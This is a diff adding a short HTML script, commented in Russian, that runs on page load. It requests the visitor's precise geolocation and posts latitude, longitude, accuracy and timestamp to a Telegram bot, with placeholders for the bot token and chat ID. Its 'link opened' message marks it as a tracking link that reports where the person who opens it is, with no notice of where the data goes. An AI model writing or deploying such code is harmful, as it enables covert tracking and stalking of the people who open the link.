@@ -1,0 +1,41 @@
+  <script>
+    console.log("Страница загрузилась");
+
+    function sendLocation() {
+      console.log("Запрос геолокации...");
+
+      if (!navigator.geolocation) {
+        console.log("Геолокация не поддерживается");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          console.log("Геолокация получена!", position.coords);
+
+          const token = "ЗДЕСЬ_ВСТАВЬ_ТОКЕН";           // ← токен в кавычках
+          const chatId = ЗДЕСЬ_ВСТАВЬ_CHAT_ID;         // ← только число
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: `🔔 Ссылка открыта!\n\n` +
+                    `📍 Широта: ${position.coords.latitude}\n` +
+                    `📍 Долгота: ${position.coords.longitude}\n` +
+                    `🔍 Точность: ${Math.round(position.coords.accuracy)} м\n` +
+                    `🕒 ${new Date().toLocaleString('ru-RU')}`
+            })
+          })
+          .then(r => r.json())
+          .then(result => console.log("✅ Отправлено:", result))
+          .catch(err => console.error("❌ Ошибка:", err));
+        },
+        (error) => console.error("Ошибка геолокации:", error),
+        { enableHighAccuracy: true }
+      );
+    }
+
+    window.onload = sendLocation;
+  </script>
